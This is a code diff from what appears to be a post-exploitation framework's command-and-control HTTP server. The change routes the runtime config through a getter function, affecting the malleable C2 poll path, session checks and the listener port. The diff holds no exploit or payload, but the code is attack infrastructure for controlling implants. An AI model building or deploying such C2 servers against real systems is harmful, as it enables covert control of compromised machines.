@@ -52,7 +52,7 @@ func allowClientRequest(req *http.Request) bool {
 
 // c2HTTPPollPath returns the malleable path http_poll clients dial.
 func c2HTTPPollPath() string {
-	if path := live.RuntimeConfig.MalleableC2.C2Path; path != "" {
+	if path := live.GetRuntimeConfig().MalleableC2.C2Path; path != "" {
 		return path
 	}
 	return "/"
@@ -61,7 +61,7 @@ func c2HTTPPollPath() string {
 // handleC2HTTPPoll serves one http_poll request. It is shared by the plain
 // HTTP listener and the TLS frontend so both expose exactly the same backend.
 func handleC2HTTPPoll(w http.ResponseWriter, req *http.Request) {
-	if !transport.IsActiveHTTPServerSession(req, &live.RuntimeConfig.MalleableC2) {
+	if !transport.IsActiveHTTPServerSession(req, &live.GetRuntimeConfig().MalleableC2) {
 		if !allowClientRequest(req) {
 			logging.Warningf("C2 HTTP Server: rate limit exceeded for %s", req.RemoteAddr)
 			transport.WriteBareStatus(w, http.StatusTooManyRequests)
@@ -69,7 +69,7 @@ func handleC2HTTPPoll(w http.ResponseWriter, req *http.Request) {
 		}
 	}
 
-	stream, err := transport.HandleHTTPServerSession(w, req, &live.RuntimeConfig.MalleableC2)
+	stream, err := transport.HandleHTTPServerSession(w, req, &live.GetRuntimeConfig().MalleableC2)
 	if err == transport.ErrPollingRequest {
 		// It was a polling internal multiplexing request, handled successfully
 		return
@@ -87,7 +87,7 @@ func handleC2HTTPPoll(w http.ResponseWriter, req *http.Request) {
 
 // StartC2HTTPServer starts the plain HTTP transport server.
 func StartC2HTTPServer() {
-	if live.RuntimeConfig.CCHTTPPort == "" {
+	if live.GetRuntimeConfig().CCHTTPPort == "" {
 		logging.Errorf("StartC2HTTPServer: CCHTTPPort is not set in config")
 		return
 	}
@@ -113,7 +113,7 @@ func StartC2HTTPServer() {
 	}
 
 	server := &http.Server{
-		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCHTTPPort),
+		Addr:    fmt.Sprintf(":%s", live.GetRuntimeConfig().CCHTTPPort),
 		Handler: mux,
 		// Bound slow-header (slowloris) and idle keep-alive connections. Do
 		// not set ReadTimeout/WriteTimeout: this transport long-polls for up
@@ -129,8 +129,8 @@ func StartC2HTTPServer() {
 	// discipline the TLS/h2 server uses.
 	network.SetEmpHTTPServer(server)
 
-	logging.Successf("🚀 Starting plain HTTP C2 server at port %s", live.RuntimeConfig.CCHTTPPort)
+	logging.Successf("🚀 Starting plain HTTP C2 server at port %s", live.GetRuntimeConfig().CCHTTPPort)
 	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
-		logging.Fatalf("Failed to start plain HTTP C2 server at *:%s: %v", live.RuntimeConfig.CCHTTPPort, err)
+		logging.Fatalf("Failed to start plain HTTP C2 server at *:%s: %v", live.GetRuntimeConfig().CCHTTPPort, err)
 	}
 }
